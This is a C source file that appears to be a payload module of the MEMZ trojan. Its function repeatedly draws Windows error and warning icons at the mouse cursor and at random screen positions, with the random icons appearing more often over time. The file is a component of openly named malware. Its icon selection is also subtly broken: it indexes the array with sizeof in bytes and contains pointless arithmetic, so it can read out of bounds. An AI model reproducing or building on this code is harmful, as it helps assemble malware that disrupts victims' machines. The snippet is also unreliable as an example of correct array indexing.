#include "../MEMZ.h"

LPCTSTR errorIcons[] = {
	IDI_ERROR,
	IDI_INFORMATION,
	IDI_QUESTION,
	IDI_WARNING
};

PAYLOADFUNCTIONVISUAL(payloadDrawErrors) {
	PAYLOADHEAD
	
	LPCTSTR iconName = errorIcons[(random() % ((sizeof(errorIcons) - 1) + 1) - 0 + 0)];
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, iconName));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%(w-ix), random()%(h-iy), LoadIcon(NULL, IDI_WARNING));
	}

	out: return 2;
}
